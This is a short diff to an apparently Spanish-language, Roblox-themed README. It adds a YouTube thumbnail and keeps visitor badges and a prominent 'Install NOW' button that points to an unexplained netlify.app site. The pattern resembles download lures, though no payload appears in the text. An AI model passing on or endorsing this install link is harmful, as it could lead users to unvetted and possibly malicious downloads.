@@ -2,7 +2,9 @@
 
 ![Visitantes: 8K+](https://img.shields.io/badge/Visitantes-8K+-4CAF50) ![Actualizado: Septiembre 2025](https://img.shields.io/badge/Actualizado-Septiembre_2025-2196F3)  
 
--
+![Primera Vista](https://i.ytimg.com/vi/HvArylN11u4/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLB25HvvUrkBwjurUGjNgKhmzgUzvA)
+
+
 [![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 
 
